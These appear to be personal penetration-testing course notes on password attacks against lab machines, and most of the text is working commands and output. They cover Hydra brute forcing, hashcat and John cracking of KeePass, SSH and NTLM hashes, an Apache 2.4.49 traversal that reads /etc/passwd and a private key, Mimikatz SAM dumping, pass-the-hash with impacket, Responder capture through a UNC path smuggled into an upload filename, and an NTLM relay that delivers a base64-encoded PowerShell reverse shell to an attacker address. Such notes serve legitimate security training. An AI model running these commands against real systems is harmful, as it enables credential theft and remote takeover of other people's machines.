Hydra Use/Syntax

Hydra password cracking
Syntax:
	hydra -l <username> -P <Wordlist> -s <port> ssh://<ip>   [using ssh with a known user but unknown password]
	
	hydra -L <namelist> -p <password> rdp://<ip>			 [using rdp with known password but unknown users]
	
	hydra -l <username> -P <wordlist> rdp://<ip>			 [the inverse of above]
	
https://os.cybbh.io/public/os/latest/index.html

HTTP POST Exploitation
	Look up Tiny File Manager
	Find that it has 2 default users:
		Admin
		User
	Open BurpSuite
	Go to Proxy and start intercept
	Open up browser and attempt to login with any creds
	This will allow us to capture the POST request for the site
	Copy the login attempt for use with Hydra
		
		fm_usr=user&fm_pwd=Test
	
	Next we need to capture a failed login identifier for Hydra
	In this case it is:
		Login failed. Invalid username or password
		
	You will format hydra as shown below to run the wordlist:
	
		hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.58.201 http-post-form "/index.php:fm_user=user&fm_pwd=^PASS^:Login failed. Invalid"

		"http-post-form" is an argument that accepts three colon-delimited fields
		
		First Field: index.php [location of the login form]
		Second Field: The login request body identified with BurpSuite
		Third Field: The failed login identifier ["Login failed" string, shortened to reduce false positives {username and password generally cause this
		
	Now use provided Hydra creds and attempt logins
	
	In the next example, it is a GET request
	For that GET request we will modify the command as shown below:
			
		hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.58.201 http-get
		
	Much simpler, in this case it returned the correct credetnials
	
Creating Demo Rule Files to Edit Rockyou.txt in Execution
	In the example given, I am asked to add "1@3$5" to the end of every password
	The command to create the rule is shown below:
		
		echo "\$1 \$@ \$3 \$$ \$5" > demo.rule
		
		cat demo.rule (to verify)
		
	From there you plug this into hashcat
			
		hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo.rule --force
		
Password Manager
	In the example shown, a system has KeePass installed, which is a password manager
	Database files are stored as ".kdbx" files, to find this file on Windows use:
	
		Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
		
	From there we can use keepass2john which will format the hashes for us:
	
		keepass2john Database.kdbx > keepass.hash
		
		cat keepass.hash [if when viewing the contents you see "Database" prepended, remove it with a text-editor"
		
	Now to crack it we can use this command to find the -m code:
	
		hashcat --help | grep -i "KeePass"
		
	In this example, we will use the rockyou-30k rule, a ruleset which contains 30k rules for passwords:
	
		hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
		
	Lab:
		RDP into system with given creds:
		
			xfreedrp /u:jason /p:lab /v:192.168.58.203
		
		Verify existence of keepass 
		
		Run command to locate KeePass database
		
			Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
			
		Once found, transfer to attack box to crack hash
		
			scp C:\Users\jason\Documents\Database.kdbx kali@192.168.49.58:/home/kali

		Now use keepass2john to format the file for use:
		
			keepass2john Database.kdbx > keepass.hash 
			
			cat keepass.hash
			
			vim keepass.hash (removed leading database)
			
		From here use hashcat to crack the hash
	
			hashcat --help | grep -i "KeePass"
			
			hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
			
			Result:
				
				qwertyuiop123!
				
		Return to RDP session and input password for access
		
	Lab 2:
		Started by enumerating VM #2
			
			nmap -p- -T5 -v 192.168.58.227 -sV
			
			Most notable ports were 3389 (RDP) and 445 (SMB)
			
		From here I will use Hydra with the supplied username to try and find an RDP password
		
			hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.58.227
			
			Result:
			
				Login: nadine
				Password: 123abc
				
		Now I will RDP into the system
			
			xfreerdp /u:nadine /p:123abc /v:192.168.58.227
			
		Again, verify existence of KeePass, then run command to find database
		
			Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
			
			It is also located in nadines Documents directory, I will scp it over
			
		From here, all steps are a replication of the prior lab
		

SSH Private Key Passphrase
	Once someone elses id_rsa file is acquired, permissions NEED to be changed to 600
	
		chmod 600 id_rsa
		
	From there, you can attempt ssh logons, or immediately move to format the hash in the id_rsa file with ssh2john
	
		ssh2john id_rsa > ssh.hash
		
		cat ssh.hash
		
		vim ssh.hash (again removing the file name prepended)
		
	In the demo, we see that in a text file we found a password list and note to self about how the pwd policy is updating
	We will create a rule for the ssh based on this new policy of 3 Numbers, a Capital letter, and a special character
	The most common format for passwords is capital letter first, numbers second to last, and special character last
	
		echo "c \$1 \$3 \$7 \$!\nc \$1 \$3 \$7 \$@\nc \$1 \$3 \$7 \$#" > ssh.rule (most common special characters)
		
	Hashcat is weird about SSH these days so we will instead use JohntheRipper
	To use the rule file, we need to prepend a name
	
		vim ssh.rules
		
		[List.Rules:sshRules]
		
	Then we need to add these rules to JtR's configuration file
	
		sudo sh -c  'cat /home/kali/ssh.rule >> /etc/john/john.conf'
		
	From here we can use JtR with the rules and passwords to crack the hash
	
		john --wordlist=ssh.passwords --rules=sshRules ssh.hash
		
	SSH with someones elses id_rsa file:
	
		ssh -i id_rsa (all the rest of normal info goes after)
		
	Lab 2:
	
		For this we had to enumerate 192.168.52.201 to find a way to access port 2223
		
		The version of apache running, 2.4.49, is vulnerable to directory traversal
		
			curl --path-as-is http://192.168.52.201/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
				[This verifies existence of alfred]
				
			curl --path-as-is http://192.168.52.201/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/alfred/.ssh/id_rsa
				[Allows us to take his RSA key]
				
		From here, with his id_rsa file, we can crack it with ssh2john and log in for the flag.
		

NTLM Password Cracking

	We'll retrieve passwords from the SAM of the MARKETINGWK01 machine at 192.168.50.210. We can log in to the system via RDP as user offsec, using lab as the password.
	
		Get-LocalUser
		
	We'll use Mimikatz (located at C:\tools\mimikatz.exe) to check for stored system credentials.
	
		cd C:\tools
		
		ls
		
		.\mimikatz.exe
		
	sekurlsa::logonpasswords, which attempts to extract plaintext passwords and password hashes from all available sources. 
	lsadump::sam, which will extract the NTLM hashes from the SAM.
	token::elevate to elevate to SYSTEM user privileges.
	privilege::debug must be enabled to use skurlsa and lsadump
	
		mimikatz # privilege::debug
		Privilege '20' OK

		mimikatz # token::elevate
		Token Id  : 0
		User name :
		SID name  : NT AUTHORITY\SYSTEM

		656     {0;000003e7} 1 D 34811          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
		 -> Impersonated !
		 * Process Token : {0;000413a0} 1 F 6146616     MARKETINGWK01\offsec    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary
		 * Thread Token  : {0;000003e7} 1 D 6217216     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
		 
		mimikatz # lsadump::sam
		Domain : MARKETINGWK01
		SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
		Local SID : S-1-5-21-4264639230-2296035194-3358247000
		 
		RID  : 000003e9 (1001)
		User : offsec
		  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
		 
		RID  : 000003ea (1002)
		User : nelly
		  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
		...

	Grab the hash and copy it into a file then use NTLM to crack it
	
		hashcat --help | grep -i "ntlm"
		
		hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
		

Cracking NTLM Lab #2

	Access VM #2 via RDP as user nadine with the password retrieved in the exercise of the section labeled "Password Manager" and leverage the methods from this section to extract Steve's NTLM hash. Use best64.rule for the cracking process and enter the plain text password as answer to this exercise.
	
	First, verified KeePass is present on the system
	
	Extracted KeePass database file
	
		Opened terminal in users Document folder and SCP'd the file to kali box
		
		scp .\Database.kdbx kali@192.168.49.52:/home/kali
		
	Converted file to crack
	
		keepass2john Database.kdbx > keepass.hash
		
		vim keepass.hash
		
		hashcat --help | grep -i "KeePass"
		
		hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
	
		Result:
		
			pinkpanther1234
	
	Start Powershell as Administrator
	
		cd C:\tools
		
		.\mimikatz.exe
		
		privilege::debug
		
		token::elevate
		
		lsadump::sam
		
	Extract Hash and Crack it with Hashdump
	
		echo "2835573fb334e3696ef62a00e5cf7571" > steve.hash
		
		hashcat -m 1000 steve.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
		
		Result:
		
			francesca77
			
	
Passing NTLM

	In some instance hashes are too complex to be cracked reasonably so you have to use pass-the-hash (PtH) instead
	Can use hash to authenticate with SMB, RDP, and WinRM (also mimikatz)
	
	Example:
		
		smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
		
		dir
		
		get secrets.txt
		
	The above gave us access to a SMB share, to gain a shell you can use impacket to execute Psexec.py

	Example:
		
		impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
		
		hostname
		
		ipconfig
		
		whoami
		
		exit
		
	You can also do this for wmiexec
	
	Example:
	
		impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
		
	Lab:
	
		xfreerdp in and use mimikatz to dump hashes
		
		identified admin hashes
		
		echo "e78ca771aeb91ea70a6f1bb372c186b6" > files02admin.hash
		echo "7a38310ea6f0027ee955abed1762964b" > admin.hash
		
		impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
		
		hostname - files02
		
		whoami - Administrator
		
		cd C:\Users\Administrator\Desktop
		
		dir
		
		type flag.txt
		
Cracking Net-NTLMv2

	Net-NTLMv2 exists in nearly all environments, to exploit we need to catch an authentication attempt toa system we control
	Responder is good for this, it hosts a built-in SMB server and prints captured hashes
	Also includes Link-Local Multicast Name Resolution (LLMNR), NetBios Name Service (NBT-NS) and Multicast_DNS (MDNS)
	
		nc 192.168.50.211 4444
		
		whoami
		
		net user paul (checking to see group permissions)
	
	We'll run responder as sudo to enable permissions needed to handle privileged raw socket operations for the various protocols. We'll set the listening interface with -I
	
		ip a
		
		sudo responder -I tap0
	
	Our next step is to request access to a non-existent SMB share on our Responder SMB server using paul's bind shell. We'll do this with a simple dir listing of \\192.168.119.2\test, in which "test" is an arbitrary directory name. We are only interested in the authentication process, not a share listing.
	
		dir \\192.168.119.2\test
		
		...
		[+] Listening for events... 
		[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211
		[SMB] NTLMv2-SSP Username : FILES01\paul
		[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e
		
		kali@kali:~$ cat paul.hash   	paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E00480055005800430034005400490043000400340057...

		kali@kali:~$ hashcat --help | grep -i "ntlm"
		   5500 | NetNTLMv1 / NetNTLMv1+ESS                           | Network Protocol
		  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                      | Network Protocol
		   5600 | NetNTLMv2                                           | Network Protocol
		  27100 | NetNTLMv2 (NT)                                      | Network Protocol
		   1000 | NTLM                                                | Operating System
	   
	Then Cracking the Hash
	   
		hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
		
		Result:
			
			123Password123
		
	Lab 2:
	
		For this one you are only given the IP to a server with a web application
		
		There are no login fields so you cant do that
		
		The only identifiable option was a file upload button
		
		When using it it just seemed to take anything
		
		Going on BurpSuite and intercepting the file upload allowed this
		
			POST /upload HTTP/1.1
			Host: marketingwk01:8000
			Content-Length: 190
			Cache-Control: max-age=0
			Accept-Language: en-US,en;q=0.9
			Origin: http://marketingwk01:8000
			Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryU5QYwaQumr2wgIL9
			Upgrade-Insecure-Requests: 1
			User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
			Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
			Referer: http://marketingwk01:8000/
			Accept-Encoding: gzip, deflate, br
			Connection: keep-alive

			------WebKitFormBoundaryU5QYwaQumr2wgIL9
			Content-Disposition: form-data; name="myFile"; filename="\\\\192.168.49.52\\file.txt"
			Content-Type: application/octet-stream


			------WebKitFormBoundaryU5QYwaQumr2wgIL9--
			
			Emphasis on the filename portion, whereby I had responder running and forced an authentication request, gaining me the systems hashes
			
			Result:
			
				[SMB] NTLMv2-SSP Hash     : sam::MARKETINGWK01:57531e41722bcb1c
				
				[SMB] NTLMv2-SSP Hash     : sam::MARKETINGWK01:1e67f7f9c3e79ca
				
				[SMB] NTLMv2-SSP Hash     : sam::MARKETINGWK01:1973c8af1c8069df
				
				[SMB] NTLMv2-SSP Hash     : sam::MARKETINGWK01:3b9b3c07ab6fbddd
				
				[SMB] NTLMv2-SSP Hash     : sam::MARKETINGWK01:2715741d07569cec:775F147FDC800F26348411EC90CFD774:0101000000000000802AC9155930DC0147C46A7027F7917300000000020008004F004A005100420001001E00570049004E002D003100320048004400440049004C00490053004900590004003400570049004E002D003100320048004400440049004C0049005300490059002E004F004A00510042002E004C004F00430041004C00030014004F004A00510042002E004C004F00430041004C00050014004F004A00510042002E004C004F00430041004C0007000800802AC9155930DC010600040002000000080030003000000000000000000000000020000014FF970AEB8E8416F1E5D5B21CFFB7AEE516480F1CC791C83444E1D0E07BF22E0A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00340039002E00350032000000000000000000         

			From here, Crack the Hash
			
			hashcat -m 5600 sam.hash /usr/share/wordlists/rockyou.txt --force
			
			Result:
			
				DISISMYPASSWORD
				
	
Relaying Net-NTLMv2
	
	For this, we will have to try and gain access as an unprivileged user meaning no mimikatz
	
	Instead of merely printing the Net-NTLMv2 hash used in the authentication step, we'll forward it to FILES02. If files02admin is a local user on FILES02, the authentication is valid and therefore accepted by the machine. If the relayed authentication is from a user with local administrator privileges, we can use it to authenticate and then execute commands over SMB.
	
	We'll perform this attack with ntlmrelayx, another tool from the impacket library.
	
	Options:
	
		--no-http-server to disable the HTTP server since we are relaying an SMB connection
		
		-smb2support to add support for SMB2
		
		-t to set the target
		
		we'll set our command with -c
		
		impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
		
	Next, we'll start a Netcat listener on port 8080 (in a new terminal tab) to catch the incoming reverse shell.
	
		nc -nvlp 8080
		
	Now we'll run Netcat in another terminal to connect to the bind shell on FILES01 (port 5555). After we connect, we'll enter dir \\192.168.119.2\test to create an SMB connection to our Kali machine.
	
		nc 192.168.50.211 5555
		
		whoami
		
		dir \\192.168.119.2\test
		
		Encoded Command Syntax:
		
			pwsh
			
			$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
			
			$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
			
			$EncodedText =[Convert]::ToBase64String($Bytes)
			
			$EncodedText
			JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADUAMgAiACwAOAAwADgAMAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
			
			exit
